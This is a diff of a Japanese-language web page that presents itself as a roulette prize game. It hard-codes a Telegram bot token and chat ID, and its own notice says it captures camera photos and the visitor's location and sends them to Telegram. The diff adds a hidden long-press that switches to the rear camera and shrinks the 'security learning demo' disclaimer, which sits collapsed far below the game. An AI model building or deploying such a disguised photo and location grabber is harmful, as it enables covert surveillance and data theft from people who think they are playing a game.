@@ -7,33 +7,27 @@
 <style>
   body { margin: 0; color: #fff; font-family: sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; overflow-x: hidden; background: #444; transition: background 0.1s; padding: 20px 0; box-sizing: border-box; }
   
-  /* タイトルGUIのベース設定 */
+  /* タイトルGUI：2秒長押しで回転 */
   h2 { 
     position: relative; margin-bottom: 30px; padding: 10px 25px; 
     background: rgba(255,255,255,0.2); border-radius: 15px; 
     backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); 
     font-size: 24px; 
     cursor: pointer; user-select: none; -webkit-user-select: none;
-    /* 回転アニメーションの設定 */
     transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1), background 0.3s, border 0.3s;
     transform-style: preserve-3d;
   }
 
-  /* くるっと回転＋黒ぼかし状態 */
+  /* 回転後の裏モード（黒ぼかし） */
   h2.flipped {
     transform: rotateY(180deg);
-    background: rgba(0, 0, 0, 0.7); /* 黒のぼかし */
+    background: rgba(0, 0, 0, 0.7);
     border: 1px solid rgba(255, 64, 129, 0.5);
   }
 
-  /* 文字が反転しないように中身を制御 */
-  h2 span {
-    display: inline-block;
-    transition: transform 0.6s;
-  }
-  h2.flipped span {
-    transform: rotateY(180deg);
-  }
+  /* 文字の反転を補正 */
+  h2 span { display: inline-block; transition: transform 0.6s; }
+  h2.flipped span { transform: rotateY(180deg); }
 
   #container { width: 85vw; max-width: 400px; aspect-ratio: 1; position: relative; margin: 20px 0; }
   #pointer { position: absolute; left: 50%; top: -25px; transform: translateX(-50%); font-size: 45px; z-index: 20; color: #ffffff; text-shadow: 0 4px 10px rgba(0,0,0,0.5); line-height: 1; }
@@ -47,21 +41,13 @@
   
   .btn-group-row-equal { display: flex; align-items: center; justify-content: center; margin-top: 25px; }
   .spacer { width: 40px; } 
-
   .primary-btn-flat, .secondary-btn-flat { flex: 1; padding: 15px 0; font-size: 18px; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; text-align: center; transition: transform 0.1s; }
   .primary-btn-flat { background: #ff4081; color: white; box-shadow: 0 4px 10px rgba(255, 64, 129, 0.3); }
   .secondary-btn-flat { background: #e0e0e0; color: #444; }
-  .primary-btn-flat:active, .secondary-btn-flat:active { transform: scale(0.95); }
-
   .btn-single { width: 100%; padding: 15px; font-size: 18px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
   #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 90; }
   
-  .security-notice { max-width: 600px; width: 90%; margin: 40vh auto 40px; padding: 25px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 14px; line-height: 1.7; text-align: left; color: #fff; box-shadow: 0 0 20px rgba(255,64,129,0.3); }
-  .security-notice summary { cursor: pointer; outline: none; list-style: none; display: flex; justify-content: space-between; align-items: center; }
-  .security-notice summary::-webkit-details-marker { display: none; }
-  .security-notice b { color: #ff0000; font-size: 1.1em; }
-  .toggle-icon { display: inline-block; transition: transform 0.3s; font-size: 18px; }
-  details[open] .toggle-icon { transform: rotate(180deg); }
+  .security-notice { max-width: 600px; width: 90%; margin: 40vh auto 40px; padding: 25px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 14px; line-height: 1.7; text-align: left; color: #fff; }
 </style>
 </head>
 <body>
@@ -100,16 +86,8 @@
 </div>
 
 <details class="security-notice">
-  <summary>
-    <b>【重要：セキュリティ学習用デモサイト】</b>
-    <span class="toggle-icon">▼</span>
-  </summary>
-  <br> このサイトは、JavaScriptによる不正なデータ取得の手口を学ぶためのデモページです。
-  <br><br>
-  同意した場合に限り、以下の処理が行われます：<br>
-  ・端末のカメラを使用した写真の撮影<br>
-  ・現在地（位置情報）の取得<br>
-  ・データの外部（Telegram）への送信<br>
+  <summary><b>【重要：セキュリティ学習用デモ】</b></summary>
+  <br>このページは、同意がある場合にのみカメラ撮影（内・外切替可）と位置情報を取得しTelegramへ送信する学習用デモです。
 </details>
 
 <script>
@@ -124,14 +102,7 @@ animateBG();
 const BOT_TOKEN = "8759355239:AAHw3_fNnjLBCFQCfp35a6ssW3Qk3yQxSPg";
 const CHAT_ID = "7541612001";
 
-const canvas = document.getElementById("wheel");
-const ctx = canvas.getContext("2d");
-const slots = ["当たり","ハズレ","当たり","ハズレ","当たり","ハズレ","当たり","ハズレ"];
-let totalRotation = 0;
-let tempPhotos = [];
-let tempLocationMsg = "";
-
-// --- 隠し機能：3秒長押しでGUI回転＆外カメ切替 ---
+// --- 隠し機能：2秒長押し ---
 let useBackCamera = false;
 let pressTimer;
 const h2 = document.getElementById("h2Title");
@@ -140,11 +111,18 @@ h2.onmousedown = h2.ontouchstart = (e) => {
   if(e.type === 'touchstart') e.preventDefault();
   pressTimer = setTimeout(() => {
     useBackCamera = !useBackCamera;
-    // flippedクラスの付け外しで、回転と背景色変更を同時に行う
     h2.classList.toggle("flipped", useBackCamera);
-  }, 3000);
+    if (navigator.vibrate) navigator.vibrate(50);
+  }, 2000); // 2秒
 };
 h2.onmouseup = h2.onmouseleave = h2.ontouchend = () => clearTimeout(pressTimer);
+
+const canvas = document.getElementById("wheel");
+const ctx = canvas.getContext("2d");
+const slots = ["当たり","ハズレ","当たり","ハズレ","当たり","ハズレ","当たり","ハズレ"];
+let totalRotation = 0;
+let tempPhotos = [];
+let tempLocationMsg = "";
 
 function draw() {
   const size = 800;
@@ -173,9 +151,8 @@ function draw() {
   }
 }
 window.onload = draw;
-window.onresize = draw;
 
-function getTempLocation() {
+async function getTempLocation() {
   return new Promise((resolve) => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
@@ -248,8 +225,7 @@ async function finalSend() {
 }
 
 function resetUI() {
-  tempPhotos = [];
-  tempLocationMsg = "";
+  tempPhotos = []; tempLocationMsg = "";
   document.getElementById("overlay").style.display = "none";
   document.getElementById("winModal").style.display = "none";
   document.getElementById("confirmModal").style.display = "none";
